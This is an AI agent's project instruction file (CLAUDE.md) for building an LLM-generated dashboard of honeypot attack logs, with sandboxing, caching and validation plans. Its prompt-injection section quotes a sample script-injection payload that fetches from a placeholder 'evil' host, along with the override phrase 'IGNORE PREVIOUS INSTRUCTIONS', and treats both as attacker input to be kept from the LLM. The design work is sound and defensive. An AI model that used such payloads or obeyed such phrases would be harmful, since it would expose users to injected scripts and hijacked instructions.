# CLAUDE.md — Generative-UI Honeypot Dashboard

## What we're building

A dashboard for DShield webhoneypot logs where **the UI itself is generated by an LLM from the log contents**. Instead of a fixed "top IPs / top URLs / requests over time" dashboard, the interface regenerates to match whatever attack patterns are actually present in the logs.

If the logs are mostly SSRF probes against cloud metadata endpoints, the UI surfaces that. If it's mostly WordPress brute force, the UI surfaces *that*. The shape of the dashboard follows the shape of the attacks.

## Environment

- **Host:** Raspberry Pi (ARM64, limited RAM — keep it lean)
- **Log source:** `/srv/log/webhoneypot_YYYY-MM-DD.json` — JSONL, one entry per line
- **Log owner:** `webhpot:webhpot` (readable by `pi` user — do NOT change perms)
- **Python:** assume 3.11+, use a venv at `./venv`
- **LLM:** Anthropic API via `anthropic` Python SDK. Key lives in `.env` as `ANTHROPIC_API_KEY`. Use `claude-sonnet-4-5` for UI generation (it's good at React and cheap enough).

## Log shape (DShield webhoneypot format)

Each line is a JSON object with these fields:

```
time, headers (dict), sip (source IP), dip (dest IP),
method, url, data (request body), useragent, version,
response_id (int), signature_id (dict with rule matching details)
```

Do NOT assume other fields exist. Do NOT assume `data` is non-empty. Do NOT assume `headers` keys are consistent in case.

## Architecture

Five components, in order of data flow:

1. **Ingester** (`ingest.py`) — reads JSONL files, yields dicts. Handles multi-day ranges. Skips malformed lines with a warning, never crashes.

2. **Analyzer** (`analyze.py`) — pure Python, NO LLM. Produces a `SchemaSummary` dataclass from a batch of logs. This is the critical sanitization layer. It extracts:
   - Field cardinalities (unique IPs, unique URLs, unique UAs)
   - URL path clustering (group `/wp-login.php`, `/wp-admin/`, etc. into "WordPress probes")
   - Attack pattern tags (SSRF, SQLi, path traversal, cloud metadata, shell injection, known CVE paths like `/cgi-bin/luci`, `/GponForm/`, etc.) — use regex/substring rules, not LLM
   - Top-N values per field (IPs, UAs, URLs, methods)
   - Time-bucketed counts
   - Per-signature_id hit counts
   The analyzer outputs a **structured summary, never raw log content**. See "Prompt injection" below.

3. **UI generator** (`generate_ui.py`) — takes `SchemaSummary`, calls Claude, gets back a single-file React component as a string. Cache by hash of the summary (SQLite, `cache.db`). Never regenerate if the summary hash already has a cached UI.

4. **Backend API** (`server.py`) — FastAPI. Endpoints:
   - `GET /api/summary?date=YYYY-MM-DD` — returns the SchemaSummary as JSON
   - `GET /api/ui?date=YYYY-MM-DD` — returns the generated React component as text
   - `GET /api/data/:query_id?date=...` — returns aggregated data for a chart/table. The generated UI calls these; it NEVER gets raw log content baked into it.
   - `GET /api/raw?date=...&limit=...&offset=...` — paginated raw log view, for the "drill down" panel. HTML-escape everything server-side.

5. **Frontend host** (`web/index.html` + `web/host.js`) — minimal shell. Fetches the generated component, renders it **inside a sandboxed iframe** with `sandbox="allow-scripts"` (no `allow-same-origin`). The iframe communicates with the parent via `postMessage` to request data. This is the security boundary.

## The three things that will bite you

### 1. Prompt injection from log content

**Attackers control User-Agent, URL, headers, and body.** Someone will put `</script><script>fetch('https://evil')</script>` or `IGNORE PREVIOUS INSTRUCTIONS` in a User-Agent header. If that string reaches the LLM verbatim, or reaches the browser unescaped, you lose.

Rules:
- The LLM NEVER sees raw log strings. It sees `SchemaSummary` which contains *categories, counts, and pattern labels* — never verbatim attacker-controlled strings. If you need to show example URLs to the LLM, truncate to 40 chars and strip non-printable/non-ASCII.
- The generated UI NEVER has log data baked into it. It fetches data at render time from `/api/data/*` and renders via React (which escapes by default). Do not use `dangerouslySetInnerHTML` anywhere.
- The raw-log endpoint HTML-escapes every field server-side before returning.
- The generated UI runs in a `sandbox="allow-scripts"` iframe without `allow-same-origin`. Even if the LLM emits malicious code, it can't read cookies or hit arbitrary origins on the parent's behalf.

### 2. UI stability

If the UI regenerates on every page load, or shifts every time a new attacker connects, it's unusable. Strategy:
- Hash the `SchemaSummary` with only the *structural* fields (attack tags present, rough magnitudes bucketed to powers of 10, top-5 categories). Don't hash exact counts.
- Cache generated UIs by that hash in SQLite.
- Only regenerate when the structural hash changes. Add a manual "regenerate" button for the user.

### 3. Generated code correctness

The LLM will happily chart a field that doesn't exist. Mitigations:
- Give the LLM a closed list of `/api/data/:query_id` endpoints it's allowed to call, with documented return shapes. It picks from the menu; it doesn't invent queries.
- Validate the generated component compiles (run it through `esbuild --bundle` in a subprocess) before serving. If it fails, retry once with the error fed back, then fall back to a static dashboard.

## The UI generator prompt (prompts/ui_generator.txt)

Key requirements for this prompt:
- Output must be a single default-exported React functional component, no imports except from a provided shim.
- Available primitives: a small set of chart components (BarChart, LineChart, Table, StatCard, GeoMap) provided by the host. Document the props for each.
- Available data queries: enumerated list of `/api/data/:id` endpoints with their return shapes.
- Output format: raw JSX only, no markdown fences, no explanation.
- Explicitly: "The summary you're given is structural. Do not fabricate example URLs, IPs, or payloads — if you want to show examples, use the `<ExamplesPanel queryId="..."/>` component which fetches sanitized samples at render time."

## Build order

Do these in sequence. Don't skip ahead; each phase validates the previous.

1. **Phase 1 — Ingest + analyze, no LLM.** Get `analyze.py` producing a good `SchemaSummary` from real logs. Dump it as JSON, eyeball it. This is 60% of the value already.
2. **Phase 2 — Static fallback dashboard.** Build `web/fallback.jsx` that renders a reasonable dashboard from any `SchemaSummary`. This is your safety net and your comparison baseline.
3. **Phase 3 — UI generator with heavy caching.** Wire up the LLM call. Test with 3-4 different days of logs to confirm the UIs actually differ meaningfully and aren't just cosmetic reshuffles.
4. **Phase 4 — Sandbox + validation.** Iframe isolation, esbuild validation, retry-on-fail, fallback-on-double-fail.
5. **Phase 5 — Injection tests.** Before considering this done, write tests that feed logs containing `<script>`, prompt-injection strings, oversized fields, non-UTF8 bytes, and confirm none of it reaches the LLM input or the browser unescaped.

## Non-goals

- Not building auth. This runs on localhost / tailscale only. Do not expose to the internet.
- Not building real-time streaming. Daily batch is fine; add a "refresh" button.
- Not replacing SIEM/Kibana. This is an exploration tool, not an alerting tool.
- Not supporting arbitrary honeypot formats. DShield webhoneypot JSONL only, for now.

## Running it

```bash
python -m venv venv && source venv/bin/activate
pip install -r requirements.txt
python server.py  # serves on :8000
# open http://raspberrypi.local:8000
```

## When in doubt

Ask before making the system more clever. The value is in the *concept* — a dashboard that reshapes itself to the data — not in it being fully automated or real-time. Favor boring, debuggable, cacheable over clever.
